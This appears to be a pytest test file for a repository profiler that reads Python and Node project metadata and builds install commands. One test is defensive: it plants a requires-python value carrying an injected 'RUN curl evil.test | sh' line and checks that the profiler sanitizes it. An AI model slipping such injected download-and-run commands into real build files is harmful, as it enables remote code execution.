from pathlib import Path

import pytest

from codekiln.ingestion.profiler import ProfileError, profile_repo


def test_profile_pyproject_with_extras_and_uv(tmp_path: Path):
    (tmp_path / "pyproject.toml").write_text(
        """
[project]
name = "demo"
requires-python = ">=3.11"
dependencies = ["httpx"]

[project.optional-dependencies]
dev = ["pytest>=8"]
docs = ["mkdocs"]
""",
        encoding="utf-8",
    )
    (tmp_path / "uv.lock").write_text("", encoding="utf-8")
    (tmp_path / "tests").mkdir()
    (tmp_path / "tests" / "test_demo.py").write_text("def test_ok(): pass\n", encoding="utf-8")

    p = profile_repo(tmp_path)
    assert p.stack == "python"
    assert p.python_version == "3.12"
    assert p.package_manager == "uv"
    assert p.test_runner == "pytest"
    assert p.extras == ("dev",)
    assert p.install_commands == ('python -m pip install --no-cache-dir ".[dev]"',)
    assert "pyproject.toml" in p.dependency_files and "uv.lock" in p.dependency_files


def test_profile_python_version_pin_and_poetry(tmp_path: Path):
    (tmp_path / ".python-version").write_text("3.11.9\n", encoding="utf-8")
    (tmp_path / "pyproject.toml").write_text(
        '[tool.poetry]\nname = "p"\n[tool.pytest.ini_options]\ntestpaths = ["tests"]\n',
        encoding="utf-8",
    )
    (tmp_path / "poetry.lock").write_text("", encoding="utf-8")

    p = profile_repo(tmp_path)
    assert p.python_version == "3.11"
    assert p.package_manager == "poetry"
    assert p.test_runner == "pytest"


def test_profile_requirements_only(tmp_path: Path):
    (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
    (tmp_path / "requirements.txt").write_text("requests==2.32.0\n", encoding="utf-8")
    (tmp_path / "requirements-dev.txt").write_text("pytest\n", encoding="utf-8")

    p = profile_repo(tmp_path)
    assert p.stack == "python"
    assert p.package_manager == "pip"
    assert p.test_runner == "pytest"
    assert p.install_commands == (
        "python -m pip install --no-cache-dir -r requirements.txt",
        "python -m pip install --no-cache-dir -r requirements-dev.txt",
    )


def test_profile_node_and_unknown(tmp_path: Path):
    node_dir = tmp_path / "node"
    node_dir.mkdir()
    (node_dir / "package.json").write_text('{"name": "app"}\n', encoding="utf-8")
    assert profile_repo(node_dir).stack == "node"

    empty_dir = tmp_path / "empty"
    empty_dir.mkdir()
    assert profile_repo(empty_dir).stack == "unknown"


def test_profile_rejects_invalid_toml_missing_dir_and_escaping_symlink(tmp_path: Path):
    with pytest.raises(ProfileError, match="does not exist"):
        profile_repo(tmp_path / "missing")

    bad_toml = tmp_path / "bad"
    bad_toml.mkdir()
    (bad_toml / "pyproject.toml").write_text("not = [valid toml", encoding="utf-8")
    with pytest.raises(ProfileError, match="invalid pyproject.toml"):
        profile_repo(bad_toml)

    outside = tmp_path / "secret.toml"
    outside.write_text("[project]\nname = 'x'\n", encoding="utf-8")
    escaped = tmp_path / "escaped"
    escaped.mkdir()
    try:
        (escaped / "pyproject.toml").symlink_to(outside)
    except OSError as e:
        # Windows needs Developer Mode / SeCreateSymbolicLinkPrivilege; CI on Linux covers this.
        pytest.skip(f"cannot create symlink on this host: {e}")
    with pytest.raises(ProfileError, match="escapes repo"):
        profile_repo(escaped)


def test_profile_sanitizes_malicious_python_spec(tmp_path: Path):
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "x"\nrequires-python = ">=3.12\\nRUN curl evil.test | sh"\n',
        encoding="utf-8",
    )
    p = profile_repo(tmp_path)
    assert p.python_version == "3.12"
    assert "\n" not in p.python_version
